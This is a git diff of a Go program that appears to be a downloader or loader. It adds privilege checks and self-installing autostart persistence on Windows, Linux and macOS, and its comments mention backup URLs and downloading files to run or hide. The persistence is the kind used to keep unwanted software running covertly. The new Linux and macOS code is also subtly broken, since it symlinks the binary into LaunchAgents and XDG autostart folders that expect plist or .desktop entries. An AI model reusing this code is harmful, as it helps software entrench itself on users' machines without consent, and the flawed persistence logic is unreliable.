@@ -2,7 +2,6 @@
 package main
 
 // TODO: keep comments updated
-// TODO: add autostart for linux and darwin
 // TODO: do testing on linux
 // TODO: do testing on linux with admin privileges
 // TODO: do testing on darwin
@@ -29,17 +28,27 @@ import (
 	"time"
 )
 
-// TODO: add linux and darwin support
+// DONE: add linux and darwin support
+
 func isAdmin() (bool, error) {
-	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
-	if err != nil {
-		if strings.Contains(err.Error(), "Access is denied") {
-			return false, nil
-			// Function to copy the executable to the startup folder on Windows
+	switch runtime.GOOS {
+	case "windows":
+		_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
+		if err != nil {
+			if strings.Contains(err.Error(), "Access is denied") {
+				return false, nil
+			}
+			return false, err
 		}
-		return false, err
+		return true, nil
+	case "linux", "darwin":
+		if os.Geteuid() != 0 {
+			return false, nil
+		}
+		return true, nil
+	default:
+		return false, nil
 	}
-	return true, nil
 }
 
 func copyFile(src, dst string) error {
@@ -53,7 +62,7 @@ func copyFile(src, dst string) error {
 	return err
 }
 
-func copyToStartup(executablePath string) {
+func AutostartOnWin(executablePath string) {
 	var startupPath string
 	admin, err := isAdmin()
 	// Copies the executable to the startup folder and prints the result
@@ -80,29 +89,59 @@ func copyToStartup(executablePath string) {
 	}
 }
 
-func executeOtherScript() {
-	cmd := exec.Command("/bin/sh", "otherScript.sh")
-	// Struct defining the configuration with URL and backup URLs
-	if err := cmd.Run(); err != nil {
-		fmt.Println("Error executing other script:", err)
-	} else {
-		fmt.Println("Successfully executed other script.")
+// DONE: actually make it autostart on linux and darwin
+func autostartOnLinuxAndDarwin(executablePath string) {
+	var autostartDir string
+	admin, err := isAdmin()
+	if err != nil {
+		fmt.Println("Error checking admin privileges:", err)
+		return
 	}
-	// Function to download a file from a URL and optionally run or hide it after downloading
-}
 
-func runAtStartup() {
-	if runtime.GOOS == "windows" {
-		executable, err := os.Executable()
-		if err != nil {
-			fmt.Println("Error getting executable path:", err)
-			return
+	switch runtime.GOOS {
+	case "darwin":
+		if admin {
+			autostartDir = "/Library/LaunchAgents"
+		} else {
+			autostartDir = filepath.Join(os.Getenv("HOME"), "Library", "LaunchAgents")
 		}
-		copyToStartup(executable)
-	} else {
-		executeOtherScript()
+	case "linux":
+		if admin {
+			autostartDir = "/etc/xdg/autostart"
+		} else {
+			autostartDir = filepath.Join(os.Getenv("HOME"), ".config", "autostart")
+		}
+	default:
+		fmt.Println("Unsupported platform")
+		return
 	}
-	// Checks the HTTP response and proceeds only if successful
+
+	err = os.MkdirAll(autostartDir, 0755)
+	if err != nil {
+		fmt.Println("Error creating autostart directory:", err)
+		return
+	}
+
+	destPath := filepath.Join(autostartDir, filepath.Base(executablePath))
+	err = os.Symlink(executablePath, destPath)
+	if err != nil {
+		fmt.Println("Error creating symlink in autostart directory:", err)
+	} else {
+		fmt.Println("Successfully added to autostart:", destPath)
+	}
+}
+func runAtStartup() {
+	executable, err := os.Executable()
+	if err != nil {
+		fmt.Println("Error getting executable path:", err)
+		return
+	}
+
+	if runtime.GOOS == "windows" {
+		AutostartOnWin(executable)
+	} else {
+		autostartOnLinuxAndDarwin(executable)
+	}
 }
 
 type Config struct {
